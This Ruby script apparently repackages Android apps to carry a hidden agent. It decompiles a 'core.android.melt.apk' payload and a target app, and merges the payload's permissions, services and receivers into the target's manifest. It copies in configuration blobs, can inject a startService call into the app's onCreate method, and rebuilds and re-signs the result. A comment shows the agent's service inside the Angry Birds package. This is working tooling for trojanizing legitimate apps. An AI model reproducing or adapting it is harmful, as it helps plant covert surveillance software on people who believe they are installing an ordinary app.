require 'FileUtils'
require 'xmlsimple'
require 'pp'

BASE="~/android"
APKTOOL="~/Reversing/Android/apktool/2.0/apktool_2.0.0b9.jar"
BAKSMALI="~/Reversing/Android/baksmali-2.0.3.jar"
SMALI="~/Reversing/Android/smali-2.0.3.jar"
#APKTOOL="#{BASE}/apktool_1.4.3.jar"

# Unable to start service Intent { cmp=com.rovio.angrybirds/com.android.networking.ServiceCore }


def execute(command)
	print "- #{command}\n"
	system command
end

def unpack(filename)
	print "unpack #{filename}\n"

	basename=File.basename(filename, '.*')
	FileUtils.rm_rf basename
	print "delete #{basename}\n"

	prog = "java -jar #{APKTOOL} d -s -f #{filename}"
	print prog

	execute(prog)

	prog = "java -jar #{BAKSMALI} #{basename}/classes.dex -o #{basename}/smali"
	print prog
	execute(prog)

	FileUtils.rm basename + "/classes.dex"

	return File.basename(filename, '.*')
end

def mergeXml(from, to, key)
	print "merge #{from} #{to} #{key}\n"

	xt = XmlSimple.xml_in to

	if(File.exists? from) then
		xml = XmlSimple.xml_in from
		xml[key] += xt[key]
		#pp xml[key]
	else
		xml = xt
	end

	return xml
end

def parseStyle(rcsdir, pkgdir)
	style = mergeXml("#{pkgdir}/res/values/styles.xml","#{rcsdir}/res/values/styles.xml","style")
	color = mergeXml("#{pkgdir}/res/values/colors.xml","#{rcsdir}/res/values/colors.xml","color")

	manifestStyle = XmlSimple.xml_out(style)
	manifestCol =  XmlSimple.xml_out(color)

	return manifestStyle, manifestCol
end

def parseManifest(rcsdir, pkgdir)
	print "parse manifest #{rcsdir}\n"
	xmlrcs = XmlSimple.xml_in("#{rcsdir}/AndroidManifest.xml")
	print "parse manifest #{pkgdir}\n"
	xmlpkg = XmlSimple.xml_in("#{pkgdir}/AndroidManifest.xml")

	activities=xmlpkg["application"][0]["activity"]

	name=""
	activities.each do |act|
		begin
			main = act["intent-filter"][0]["action"][0]["android:name"]
			if(main == "android.intent.action.MAIN") then
				print "NAME = #{act["android:name"]}\n"
				name=act["android:name"]
				break
			end
		rescue
		end
	end

	xmlpkg["uses-permission"] += xmlrcs["uses-permission"]

	mixManifestApplication(xmlpkg,xmlrcs,"receiver")
	mixManifestApplication(xmlpkg,xmlrcs,"activity")
	mixManifestApplication(xmlpkg,xmlrcs,"service")

	manifest = XmlSimple.xml_out(xmlpkg);

	return name, manifest
end

def mixManifestApplication(xmlpkg,xmlrcs,key)
	if(xmlpkg["application"][0].has_key? key) then
		xmlpkg["application"][0][key] += xmlrcs["application"][0][key]
	else
		xmlpkg["application"][0][key] = xmlrcs["application"][0][key]
	end
end

def patchManifest(rcsdir, manifest)
	print "patch Manifest\n"
	file= File.new("#{rcsdir}/AndroidManifest.xml", "w")
	#file= File.new("AndroidManifest.xml", "w")
	manifest["<opt"]="<manifest"
	manifest["</opt"]="</manifest"
	manifest.insert(0,"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
	file.write(manifest)
	file.close
end

def patchStyle(rcsdir, style, color)
	print "patch Style\n"
	#pp style
	file = File.new("#{rcsdir}/res/values/styles.xml", "w")
	style.insert(0,"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
	style["<opt"]="<resources"
	style["</opt"]="</resources"

	style["@*android"] = "@android" if style.include? '@*android'
	file.write(style)
	file.close

	print "patch Color\n"
	#pp color
	file = File.new("#{rcsdir}/res/values/colors.xml", "w")
	color["<opt"]="<resources"
	color["</opt"]="</resources"
	#color["@*android"] = "@android"
	color.insert(0,"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
	file.write(color)
	file.close

end

def patchMain(rcsdir, pkgdir, mainpkg)
	print "patch main #{mainpkg}\n"
	#arr = mainpkg.split('.')[0..-2].join('/')
	#file = mainpkg.split('.').pop
	filename = mainpkg.split('.').join('/')
	print "filename = #{filename}\n"

	filepath = "#{rcsdir}/smali/#{filename}.smali"

	if !File.exists? filepath
		filename = (pkgdir + mainpkg).split('.').join('/')
		print "filename = #{filename}\n"
		filepath = "#{rcsdir}/smali/#{filename}.smali"
	end

	if !File.exists? filepath
		filename = (pkgdir + "." + mainpkg).split('.').join('/')
		print "filename = #{filename}\n"
		filepath = "#{rcsdir}/smali/#{filename}.smali"
	end

	contentFile = File.new(filepath, "r")
	content=contentFile.read
	contentFile.close

	oncreates=[".method public onCreate(Landroid/os/Bundle;)V", ".method protected onCreate(Landroid/os/Bundle;)V", ".method public constructor <init>()V"]

	oncreates.each{ |oncreate|
		@pos = content.index(oncreate);
		@size = oncreate.size()
		print "pos = #{@pos}\n"
		break if @pos != nil
	}

	methodFile=File.new("methodStartService.txt", "r")
	method = methodFile.read
	methodFile.close

	invoke = "    invoke-direct {p0}, L$APPNAME$;->startService()V\n"
	invoke["$APPNAME$"]=filename

	content.insert(@pos + @size +1 , invoke )

	method["$APPNAME$"]=filename

	content.insert(@pos, method)

	contentFile = File.new(filepath, "w")
	contentFile.write(content)
	contentFile.close

end

def merge(rcsdir, pkgdir)
	print "merging dirs #{rcsdir} -> #{pkgdir}\n"
	FileUtils.rm "#{rcsdir}/res/layout/main.xml"
	FileUtils.cp_r "#{pkgdir}/.", "#{rcsdir}"
end

def pack(dirname)
	print "pack #{dirname}\n"
	tempfile="#{dirname}.temp.apk"
	outfile="#{dirname}.outfile.apk"

	smalicmd = "java -jar #{SMALI} #{dirname}/smali -o #{dirname}/classes.dex"
	buildcmd = "java -jar #{APKTOOL} b #{dirname} -o #{tempfile}"
	signcmd = "jarsigner -keystore #{BASE}/server/repack/certs/android.keystore -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password #{tempfile} servicecore"
	aligncmd = "zipalign -f 4 #{tempfile} #{outfile}"

	r = execute(smalicmd)
	FileUtils.rm_rf("#{dirname}/smali")

	r &= execute(buildcmd)
	r &= execute(signcmd) if r
	r &= execute(aligncmd) if r

	FileUtils.rm_rf(tempfile)

	print "packed #{outfile} => #{r}\n" if r

	return r
end

def patchConfig(rcsdir)
	FileUtils.cp "assets/c.bin", "#{rcsdir}/assets"
	FileUtils.cp "assets/r.bin", "#{rcsdir}/assets"
end

def patchResources(rcsdir)
	puts "patch resources"
	matches = ['android:textAllCaps="true"', '<item name="android:borderTop">true</item>']
	Dir["#{rcsdir}/res/**/*.xml"].each do |filename|
		#puts filename
		found =false
		content = ""
		File.open(filename, 'r').each do |line|
			matches.each do |match|
				if line.include? match
					found = true
					puts line
					line = line.sub(match, '')
				end
			end
			content+=line

		end

		puts "#{filename} ---FOUND---" if found
		File.open("#{filename}", 'w') { |out_file| out_file.write content } if found

	end
end

def main(package)
	#FileUtils.rm("core.android.release.apk", :force => true );
	#FileUtils.cp("../../bin/android_networking-release.apk","core.android.release.apk")
	rcsdir=unpack("../output/merge/core.android.melt.apk")
	FileUtils.cp("../preprocess/AndroidManifest.BACKGROUND.xml","core.android.melt/AndroidManifest.xml")
	pkgdir=unpack(package)

	mainpkg, newmanifest = parseManifest(rcsdir, pkgdir)
	style,color = parseStyle(rcsdir, pkgdir)

	merge(rcsdir,pkgdir)

	#patchMain(rcsdir, pkgdir, mainpkg)
	patchManifest(rcsdir, newmanifest)
	patchStyle(rcsdir, style,color)
	patchConfig(rcsdir)
	#patchResources(rcsdir)

	print "moving #{pkgdir} in #{rcsdir}\n"
	FileUtils.mv(pkgdir,"tmp")
	FileUtils.rm_rf("tmp")
	FileUtils.mv(rcsdir, "./#{pkgdir}")

	return pack(pkgdir)
end

def test(package)
	pkgdir=unpack(package)
	print "pkgir: #{pkgdir}\n"
	pack(pkgdir)
end

#test

begin
	#r = main ARGV[0]
	test(ARGV[0])
	puts "merge exit => #{r}"
	exit 1 if !r
rescue Exception => ex
	puts ex
	exit 1
end

exit 0
